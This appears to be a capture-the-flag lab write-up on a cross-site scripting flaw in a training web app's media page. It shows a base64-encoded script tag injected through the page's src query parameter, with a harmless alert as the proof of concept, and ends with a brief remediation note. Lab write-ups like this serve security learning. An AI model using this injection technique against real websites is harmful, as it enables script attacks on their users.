# 09_Unprotected_media_type

Attribute accepts html/text types

## Method 

Go to http://192.168.1.59/  
Inpect the blue National Security Agency logo  
It is a link containing media, the source is not protected

## Manipulation

Base64 encode a script
```bash
<script>alert("Hello World")</script> -> base64 -> PHNjcmlwdD5hbGVydCgiSGVsbG8gV29ybGQiKTwvc2NyaXB0Pg==
```
Insert this hash into the `src` attribute
```bash
href="?page=media&src=PHNjcmlwdD5hbGVydCgiSGVsbG8gV29ybGQiKTwvc2NyaXB0Pg=="
```
Then click on the src link


## Resolve

There is no need to get images from the url rather store the src in the actual
src attribute of the image itself. If data is needed from the DB request backend
on page load through a post request.

## Resources

https://hackerone.com/reports/513105
https://www.base64encode.org/
